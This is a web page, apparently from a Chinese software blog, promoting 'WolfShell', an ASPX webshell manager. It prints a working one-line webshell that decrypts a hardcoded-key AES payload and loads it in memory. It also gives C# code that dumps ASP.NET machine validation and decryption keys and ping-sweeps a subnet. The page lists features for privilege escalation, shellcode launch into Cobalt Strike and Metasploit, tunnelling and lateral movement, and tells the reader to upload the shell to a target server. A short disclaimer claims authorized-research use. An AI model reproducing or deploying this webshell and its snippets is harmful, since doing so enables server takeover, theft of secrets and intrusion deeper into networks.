<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="renderer" content="webkit"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18Kè½¯ä»¶ AIå·¥å…· å…è´¹èµ„æº</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/libs/highlight/styles/18k.css"><meta name="generator" content="Hexo 7.3.0"></head><body id="bodyx"><div class="hd posts"><a href="javascript:history.back()" class="replay-btn">è¿”å›</a><div class="post-title"><p>é‡‘åˆšç‹¼ï¼šä¸“ä¸ºASPXè®¾è®¡çš„é«˜çº§WebShellç®¡ç†å·¥å…·</p><hr></div><div class="post-content"><p><img src="http://www.18k.icu/img/wolfshell/wolf.png" alt="WolfShell"></p><h1 id="é‡‘åˆšç‹¼ï¼šä¸“ä¸ºASPXè®¾è®¡çš„é«˜çº§WebShellç®¡ç†å·¥å…·"><a href="#é‡‘åˆšç‹¼ï¼šä¸“ä¸ºASPXè®¾è®¡çš„é«˜çº§WebShellç®¡ç†å·¥å…·" class="headerlink" title="é‡‘åˆšç‹¼ï¼šä¸“ä¸ºASPXè®¾è®¡çš„é«˜çº§WebShellç®¡ç†å·¥å…·"></a>é‡‘åˆšç‹¼ï¼šä¸“ä¸ºASPXè®¾è®¡çš„é«˜çº§WebShellç®¡ç†å·¥å…·</h1><p>é‡‘åˆšç‹¼æ˜¯ä¸€æ¬¾ä¸“ä¸º ASPX ç¯å¢ƒè®¾è®¡çš„é«˜çº§ WebShell ç®¡ç†å·¥å…·ï¼Œä¸ºå®‰å…¨ç ”ç©¶äººå‘˜å’Œæ¸—é€æµ‹è¯•äººå‘˜æä¾›å¼ºå¤§çš„å‘½ä»¤æ‰§è¡Œã€æƒé™æå‡å’Œå†…ç½‘ç©¿é€èƒ½åŠ›ã€‚</p><h2 id="ğŸš€-æ ¸å¿ƒä¼˜åŠ¿"><a href="#ğŸš€-æ ¸å¿ƒä¼˜åŠ¿" class="headerlink" title="ğŸš€ æ ¸å¿ƒä¼˜åŠ¿"></a>ğŸš€ æ ¸å¿ƒä¼˜åŠ¿</h2><ul><li>é«˜æ•ˆéšè”½çš„é€šä¿¡ï¼š é‡‡ç”¨ äºŒè¿›åˆ¶æµ ä¼ è¾“åè®®ï¼Œç¡®ä¿é€šä¿¡çš„é«˜æ•ˆæ€§ä¸éšè”½æ€§ã€‚</li><li>ç«¯åˆ°ç«¯å®‰å…¨åŠ å¯†ï¼š æ‰€æœ‰ä¼ è¾“ Payload å‡ç»è¿‡ AESåŠ å¯† ä¿æŠ¤ï¼Œä¸”æ¯æ¬¡é€šä¿¡ä½¿ç”¨ éšæœºå¯†é’¥ï¼Œä¿éšœæ•°æ®å®‰å…¨ã€‚</li><li>æ— ç—•è¿è¡Œï¼š æ”¯æŒç›´æ¥åœ¨ å†…å­˜ä¸­åŠ è½½å¹¶æ‰§è¡Œä»£ç ï¼Œæœ€å¤§ç¨‹åº¦é¿å…åœ¨ç£ç›˜ç•™ä¸‹ç—•è¿¹ï¼Œæ˜¾è‘—æå‡æ“ä½œéšè”½æ€§å’Œå®‰å…¨æ€§ã€‚</li><li>å†…ç½‘çº§è”WebShellæ§åˆ¶ï¼š é€šè¿‡ç°æœ‰å·²æ§çš„WebShellï¼Œæ— éœ€éƒ¨ç½²ä»£ç†æˆ–é…ç½®ç«¯å£è½¬å‘ï¼Œå³å¯ç›´æ¥è¿æ¥å¹¶æ§åˆ¶å¤„äºæ›´æ·±å±‚å†…ç½‘ç¯å¢ƒä¸­çš„WebShellèŠ‚ç‚¹ï¼Œå®ç°ä¾¿æ·é«˜æ•ˆçš„å†…ç½‘æ¨ªå‘ç©¿é€ã€‚</li></ul><h2 id="ğŸ”¥-åŠŸèƒ½ç‰¹æ€§"><a href="#ğŸ”¥-åŠŸèƒ½ç‰¹æ€§" class="headerlink" title="ğŸ”¥ åŠŸèƒ½ç‰¹æ€§"></a>ğŸ”¥ åŠŸèƒ½ç‰¹æ€§</h2><ul><li>Cmdå‘½ä»¤æ‰§è¡Œï¼š åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šç›´æ¥æ‰§è¡Œä»»æ„ CMD å‘½ä»¤ã€‚</li><li>PowerShellå‘½ä»¤æ‰§è¡Œï¼š æ”¯æŒæ‰§è¡Œ PowerShell è„šæœ¬å’Œå‘½ä»¤ã€‚</li><li>Shellcodeæ‰§è¡Œï¼š å¯åœ¨ç›®æ ‡ç¯å¢ƒå†…ç›´æ¥æ‰§è¡ŒåŸç”Ÿçš„ Shellcodeï¼Œä¸€é”®ä¸Šçº¿Cobalt Strikeã€Metasploitã€‚</li><li>C#ä»£ç æ‰§è¡Œï¼š æ”¯æŒåœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½ä¸æ‰§è¡Œ C# ä»£ç ã€‚</li><li>ç«¯å£è½¬å‘ï¼š å®ç°æœ¬åœ°ç«¯å£åˆ°è¿œç¨‹å†…ç½‘ä¸»æœºçš„æ˜ å°„ï¼Œæ–¹ä¾¿å®‰å…¨åœ°è®¿é—®å†…éƒ¨ç½‘ç»œæœåŠ¡ã€‚</li><li>HTTPä»£ç†ï¼š ä¸€é”®å†…å­˜æ³¨å…¥Suo5é«˜æ€§èƒ½ HTTP éš§é“ä»£ç†å·¥å…·ã€‚</li><li>Potatoææƒï¼š åˆ©ç”¨ç³»ç»ŸæœåŠ¡æ¼æ´è¿›è¡Œæƒé™æå‡ï¼Œæ”¯æŒä¸¤ç§ææƒæ¨¡å—ï¼š</li><li>efspotatoï¼š åˆ©ç”¨ EFSPotato å®ç°æƒé™æå‡ã€‚</li><li>badpotatoï¼š åˆ©ç”¨ BadPotato å®ç°æƒé™æå‡ã€‚</li><li>å†…ç½‘çº§è”Cmdå‘½ä»¤æ‰§è¡Œï¼š æ”¯æŒåœ¨å¤æ‚çš„å†…ç½‘ç¯å¢ƒä¸­ï¼Œçº§è”å†…ç½‘webshellæ‰§è¡Œ CMD å‘½ä»¤è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚</li><li>å†…ç½‘çº§è”PowerShellæ‰§è¡Œï¼š æ”¯æŒåœ¨å¤æ‚çš„å†…ç½‘ç¯å¢ƒä¸­ï¼Œçº§è”å†…ç½‘webshellæ‰§è¡Œ PowerShell å‘½ä»¤è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚</li></ul><h2 id="å®‰è£…ä¸ä½¿ç”¨"><a href="#å®‰è£…ä¸ä½¿ç”¨" class="headerlink" title="å®‰è£…ä¸ä½¿ç”¨"></a>å®‰è£…ä¸ä½¿ç”¨</h2><ol><li><p><strong>ä¸‹è½½WolfShell</strong></p><ul><li><a target="_blank" rel="noopener" href="https://github.com/0x7556/wolfshell/releases">https://github.com/0x7556/wolfshell/releases</a></li></ul></li><li><p><strong>é…ç½®ç¯å¢ƒ</strong></p><ul><li>ç¡®ä¿ç›®æ ‡ç¯å¢ƒæ”¯æŒASPXï¼Œå¹¶å·²æ­£ç¡®é…ç½®ã€‚</li></ul></li><li><p><strong>ä¸Šä¼ WolfShell</strong></p><ul><li>å°†WolfShellæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ASPXæœåŠ¡å™¨ã€‚</li></ul></li></ol><figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp">&lt;%@ Page Language=<span class="hljs-string">&quot;C#&quot;</span> %&gt;&lt;%<span class="hljs-keyword">if</span> (Request.Cookies.Count != <span class="hljs-number">0</span>) &#123; <span class="hljs-built_in">byte</span>[] k = Encoding.Default.GetBytes(<span class="hljs-string">&quot;ca63457538b9b1e0&quot;</span>); System.IO.Stream s = Request.InputStream; <span class="hljs-built_in">byte</span>[] c = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[s.Length]; s.Read(c, <span class="hljs-number">0</span>, c.Length); System.Reflection.Assembly.Load(<span class="hljs-keyword">new</span> System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, <span class="hljs-number">0</span>, c.Length)).CreateInstance(<span class="hljs-string">&quot;K&quot;</span>).Equals(<span class="hljs-keyword">this</span>); &#125;%&gt;```<br><br><span class="hljs-number">4.</span> **è®¿é—®WebShell**<br>   - é€šè¿‡å·¥å…·å®¢æˆ·ç«¯è¿æ¥WebShellï¼Œé»˜è®¤å¯†ç  WolfShellï¼Œä¿®æ”¹å¯†ç å¯ä½¿ç”¨å·¥å…·ä¸Šçš„WolfHashåŠ å¯†ã€‚<br><br>![keep](http:<span class="hljs-comment">//www.18k.icu/img/wolfshell/WolfShell.png)</span><br><br><br><span class="hljs-meta">## ç¤ºä¾‹</span><br><br><span class="hljs-meta">### Cmdå‘½ä»¤æ‰§è¡Œ</span><br><br>![CmdShellç¤ºä¾‹](http:<span class="hljs-comment">//www.18k.icu/img/wolfshell/CmdShell.png)</span><br><br><span class="hljs-meta">### PowerShellå‘½ä»¤æ‰§è¡Œ</span><br><br>![PowerShellç¤ºä¾‹](http:<span class="hljs-comment">//www.18k.icu/img/wolfshell/PowerShell.png)</span><br><br><span class="hljs-meta">### C#ä»£ç æ‰§è¡Œ</span><br><br><span class="hljs-meta">#### è·å– ValidationKey ç¤ºä¾‹ä»£ç </span><br><br>```csharp<br><br><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Reflection;<br><span class="hljs-keyword">using</span> System.Web.Configuration;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Eval</span><br>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">eval</span>(<span class="hljs-params">Object obj</span>)</span><br>&#123;<br><span class="hljs-keyword">var</span> sy = Assembly.Load(<span class="hljs-string">&quot;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span>);<br><span class="hljs-keyword">var</span> mkt = sy.GetType(<span class="hljs-string">&quot;System.Web.Configuration.MachineKeySection&quot;</span>);<br><span class="hljs-keyword">var</span> gac = mkt.GetMethod(<span class="hljs-string">&quot;GetApplicationConfig&quot;</span>, BindingFlags.Static | BindingFlags.NonPublic);<br><span class="hljs-keyword">var</span> cg = (MachineKeySection)gac.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ValidationKey: &quot;</span> + cg.ValidationKey + <span class="hljs-string">&quot; | &quot;</span> + <span class="hljs-string">&quot;Validation: &quot;</span> + cg.Validation + <span class="hljs-string">&quot; | &quot;</span> + <span class="hljs-string">&quot;DecryptionKey: &quot;</span> + cg.DecryptionKey + <span class="hljs-string">&quot; | &quot;</span> + <span class="hljs-string">&quot;Decryption: &quot;</span> + cg.Decryption + <span class="hljs-string">&quot; | &quot;</span> + <span class="hljs-string">&quot;CompatibilityMode: &quot;</span> + cg.CompatibilityMode;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="http://www.18k.icu/img/wolfshell/CodeViewKey.png" alt="C#ä»£ç ç¤ºä¾‹"></p><h4 id="æ‰«æCæ®µå­˜æ´»ä¸»æœº-ç¤ºä¾‹ä»£ç "><a href="#æ‰«æCæ®µå­˜æ´»ä¸»æœº-ç¤ºä¾‹ä»£ç " class="headerlink" title="æ‰«æCæ®µå­˜æ´»ä¸»æœº ç¤ºä¾‹ä»£ç "></a>æ‰«æCæ®µå­˜æ´»ä¸»æœº ç¤ºä¾‹ä»£ç </h4><figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"><br><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Net;<br><span class="hljs-keyword">using</span> System.Net.NetworkInformation;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Threading.Tasks;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Eval</span><br>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">eval</span>(<span class="hljs-params">Object obj</span>)</span><br>&#123;<br>StringBuilder iplist = <span class="hljs-keyword">new</span> StringBuilder();<br><span class="hljs-built_in">string</span> baseIP = <span class="hljs-string">&quot;192.168.1.&quot;</span>;<br>PingOptions options = <span class="hljs-keyword">new</span> PingOptions();<br>options.DontFragment = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">var</span> tasks = <span class="hljs-keyword">new</span> Task[<span class="hljs-number">254</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">255</span>; i++)<br>&#123;<br><span class="hljs-built_in">int</span> ipSuffix = i;<br>tasks[i - <span class="hljs-number">1</span>] = Task.Run(() =&gt;<br>&#123;<br><span class="hljs-keyword">using</span> (Ping myPing = <span class="hljs-keyword">new</span> Ping())<br>&#123;<br>PingReply reply = myPing.Send(baseIP + ipSuffix, <span class="hljs-number">120</span>);<br><span class="hljs-keyword">if</span> (reply.Status == IPStatus.Success)<br>&#123;<br><span class="hljs-keyword">lock</span> (iplist)<br>&#123;<br>iplist.AppendLine(<span class="hljs-string">&quot;Alive IP: &quot;</span> + reply.Address.ToString());<br>&#125;<br>&#125;<br>&#125;<br>&#125;);<br>&#125;<br>Task.WaitAll(tasks);<br><span class="hljs-keyword">return</span> iplist.ToString();<br>&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="http://www.18k.icu/img/wolfshell/CodeCping.png" alt="C#ä»£ç ç¤ºä¾‹"></p><h3 id="Potatoææƒç¤ºä¾‹"><a href="#Potatoææƒç¤ºä¾‹" class="headerlink" title="Potatoææƒç¤ºä¾‹"></a>Potatoææƒç¤ºä¾‹</h3><h4 id="efspotato"><a href="#efspotato" class="headerlink" title="efspotato"></a>efspotato</h4><p><img src="http://www.18k.icu/img/wolfshell/EfsPotato.png" alt="EfsPotatoç¤ºä¾‹"></p><h4 id="badpotato"><a href="#badpotato" class="headerlink" title="badpotato"></a>badpotato</h4><p><img src="http://www.18k.icu/img/wolfshell/BadPotato.png" alt="BadPotatoç¤ºä¾‹"></p><h3 id="å†…ç½‘æ‰«æç¤ºä¾‹"><a href="#å†…ç½‘æ‰«æç¤ºä¾‹" class="headerlink" title="å†…ç½‘æ‰«æç¤ºä¾‹"></a>å†…ç½‘æ‰«æç¤ºä¾‹</h3><p><img src="http://www.18k.icu/img/wolfshell/NetScan.png" alt="NetScanç¤ºä¾‹"></p><h3 id="ç«¯å£è½¬å‘ç¤ºä¾‹"><a href="#ç«¯å£è½¬å‘ç¤ºä¾‹" class="headerlink" title="ç«¯å£è½¬å‘ç¤ºä¾‹"></a>ç«¯å£è½¬å‘ç¤ºä¾‹</h3><p><img src="http://www.18k.icu/img/wolfshell/PortTran.png" alt="ç«¯å£è½¬å‘ç¤ºä¾‹"></p><h3 id="HTTPä»£ç†ç¤ºä¾‹"><a href="#HTTPä»£ç†ç¤ºä¾‹" class="headerlink" title="HTTPä»£ç†ç¤ºä¾‹"></a>HTTPä»£ç†ç¤ºä¾‹</h3><p><img src="http://www.18k.icu/img/wolfshell/Suo5Tunnel.png" alt="ç«¯å£è½¬å‘ç¤ºä¾‹"></p><h2 id="å…è´£å£°æ˜"><a href="#å…è´£å£°æ˜" class="headerlink" title="å…è´£å£°æ˜"></a>å…è´£å£°æ˜</h2><ul><li>ä½¿ç”¨WolfShellæ—¶ï¼Œè¯·éµå¾ªç›¸å…³æ³•å¾‹æ³•è§„ï¼Œç¡®ä¿åœ¨æˆæƒçš„ç¯å¢ƒä¸­è¿›è¡Œæµ‹è¯•å’Œä½¿ç”¨ã€‚</li><li>æœ¬å·¥å…·ä»…ä¾›æ•™è‚²å’Œç ”ç©¶ç›®çš„ï¼Œä»»ä½•æ»¥ç”¨è¡Œä¸ºå°†ç”±ç”¨æˆ·è‡ªè¡Œæ‰¿æ‹…åæœã€‚</li></ul><h2 id="è´¡çŒ®"><a href="#è´¡çŒ®" class="headerlink" title="è´¡çŒ®"></a>è´¡çŒ®</h2><p>æ¬¢è¿ä»»ä½•å½¢å¼çš„è´¡çŒ®ï¼è¯·æäº¤é—®é¢˜ã€å»ºè®®æˆ–æ‹‰å–è¯·æ±‚ã€‚</p><h2 id="è®¸å¯è¯"><a href="#è®¸å¯è¯" class="headerlink" title="è®¸å¯è¯"></a>è®¸å¯è¯</h2><p>æœ¬é¡¹ç›®é‡‡ç”¨MITè®¸å¯è¯ï¼Œè¯¦ç»†ä¿¡æ¯è¯·å‚è§<a href="LICENSE">LICENSE</a>æ–‡ä»¶ã€‚</p></div></div><div class="footer" id="footer"><p>Copyright Â© 2025 <a class="flink" target="_blank" rel="noopener" href="http://www.18k.icu">www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style="vertical-align:sub"><input type="checkbox" name="switch" id="update_style"> <span class="el-switch-style"></span></label></p></div><input type="hidden" id="web_style" value="black"> <input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz"> <input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf"><script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js"></script><script src="/libs/highlight/highlight.pack.js"></script><script src="/js/js.js"></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>